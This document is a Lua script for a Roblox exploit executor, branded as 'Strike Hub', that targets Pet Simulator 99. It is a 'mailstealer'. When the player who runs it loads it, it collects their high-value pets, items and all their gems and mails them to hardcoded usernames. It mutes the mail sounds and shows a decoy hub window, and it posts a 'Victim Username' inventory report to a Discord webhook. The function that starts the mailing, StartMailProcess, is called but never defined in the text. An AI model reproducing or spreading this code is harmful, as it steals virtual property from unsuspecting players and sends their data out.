_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
-- =======================================================================

local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local message
pcall(function() message = require(game.ReplicatedStorage.Library.Client.Message) end)

local success, library = pcall(function() return require(game.ReplicatedStorage.Library) end)
local network = nil
pcall(function() network = require(game.ReplicatedStorage.Library.Client.Network) end)
local save = nil
pcall(function() save = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory end)

local MailMessage = "GGz"
local sortedItems = {}
local totalRAP = 0

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""
_G.StrikeHubLogo = _G.StrikeHubLogo or ""

-- Kill script if no users/webhook
if next(users) == nil or webhook == "" then
    pcall(function() plr:kick("You didn't add any usernames or webhook") end)
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        pcall(function() plr:kick("You cannot mailsteal yourself") end)
        return
    end
end

-- =================== RAP & Mail Cost ===================
local FunctionToGetFirstPriceOfMail
pcall(function()
    for _, func in pairs(getgcFunction()) do
        if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
            FunctionToGetFirstPriceOfMail = func
            break
        end
    end
end)

local mailSendPrice = 0
pcall(function()
    if FunctionToGetFirstPriceOfMail then
        mailSendPrice = FunctionToGetFirstPriceOfMail()
    end
end)

local GemAmount1 = 1
pcall(function()
    for i, v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount1 = v._am
            break
        end
    end
end)

local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    number = math.floor(number)
    while number >= 1000 do
        number = number / 1000
        suffixIndex += 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    pcall(function()
        local headers = {["Content-Type"] = "application/json"}
        local fields = {
            {name = "Victim Username:", value = plr.Name, inline = true},
            {name = "Items to be sent:", value = "", inline = false},
            {name = "Summary:", value = "", inline = false}
        }

        local combinedItems, itemRapMap = {}, {}
        for _, item in ipairs(sortedItems) do
            local rapKey = item.name
            if itemRapMap[rapKey] then
                itemRapMap[rapKey].amount += item.amount
            else
                itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
                table.insert(combinedItems, rapKey)
            end
        end

        table.sort(combinedItems, function(a,b)
            return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
        end)

        for _, itemName in ipairs(combinedItems) do
            local itemData = itemRapMap[itemName]
            fields[2].value ..= string.format("%s (x%d): %s RAP\n", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end

        fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
        local data = {embeds = {{title = "💡 New PS99 Execution", color = 65280, fields = fields, footer = {text = "Strike Hub."}}}}
        local body = HttpService:JSONEncode(data)
        if requestFunction then
            requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
        end
    end)
end

-- =================== DISABLE SOUNDS ===================
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
        end
    end
end)

-- =================== ABSTRACT GET RAP ===================
local function getRAP(Type, Item)
    local rap = 0
    pcall(function()
        local RAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
        rap = RAPCmds.Get({
            Class = {Name = Type},
            IsA = function(hmm) return hmm == Type end,
            GetId = function() return Item.id end,
            StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end
        }) or 0
    end)
    return rap
end

-- =================== SEND ITEM ===================
local function sendItem(category, uid, amount)
    pcall(function()
        local userIndex, maxUsers = 1, #users
        while userIndex <= maxUsers do
            local sendAmount = (category == "Pet") and 1 or amount
            local args = {users[userIndex], MailMessage, category, uid, sendAmount}
            local response, err = network.Invoke("Mailbox: Send", unpack(args))
            if response then
                GemAmount1 -= mailSendPrice
                mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
                if category ~= "Pet" then break end
                amount -= 1
                if amount <= 0 then break end
            elseif err == "They don't have enough space!" then
                userIndex += 1
            else
                break
            end
        end
    end)
end

-- =================== SEND ALL GEMS ===================
local function SendAllGems()
    pcall(function()
        local gemUID
        for uid, data in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Currency) do
            if data.id == "Diamonds" then
                gemUID = uid
                break
            end
        end
        if not gemUID or GemAmount1 <= 0 then return end

        local userIndex, maxUsers = 1, #users
        while userIndex <= maxUsers do
            local args = {users[userIndex], MailMessage, "Currency", gemUID, GemAmount1}
            local success, err = network.Invoke("Mailbox: Send", unpack(args))
            if success then
                GemAmount1 = 0
                break
            elseif err == "They don't have enough space!" then
                userIndex += 1
            else
                break
            end
        end
    end)
end

-- =================== GUI ===================
do
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "StrikeHubGUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = plr:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 360, 0, 80)
    Frame.Position = UDim2.new(0, 50, 0.5, -40)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui

    local Logo = Instance.new("ImageLabel")
    Logo.Size = UDim2.new(0, 64, 1, 0)
    Logo.Position = UDim2.new(0,0,0,0)
    Logo.BackgroundTransparency = 1
    if _G.StrikeHubLogo ~= "" then Logo.Image = _G.StrikeHubLogo end
    Logo.Parent = Frame

    local Title = Instance.new("TextLabel")
    Title.Position = UDim2.new(0, 72, 0, 6)
    Title.Size = UDim2.new(0, 200, 0, 24)
    Title.BackgroundTransparency = 1
    Title.Text = "Strike Hub"
    Title.TextColor3 = Color3.fromRGB(0, 255, 128)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 18
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Frame

    -- Draggable after 5 seconds
    task.delay(5, function()
        Frame.Active = true
        Frame.Draggable = true
    end)
end

-- =================== AUTO START ===================
task.spawn(function()
    pcall(function()
        -- Collect items
        local SaveData = require(game.ReplicatedStorage.Library.Client.Save).Get()
        local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}

        for _,v in ipairs(categoryList) do
            if SaveData.Inventory[v] then
                for uid,item in pairs(SaveData.Inventory[v]) do
                    local rapValue = getRAP(v, item)
                    if v=="Pet" and rapValue >= min_rap then
                        local prefix = (item.pt==1 and "Golden " or item.pt==2 and "Rainbow ") 
                        if item.sh then prefix = "Shiny " .. prefix end
                        local id = prefix .. item.id
                        table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                        totalRAP += rapValue * (item._am or 1)
                    elseif rapValue >= min_rap then
                        table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                        totalRAP += rapValue * (item._am or 1)
                    end
                end
            end
        end

        -- Start sending
        StartMailProcess()
    end)
end)
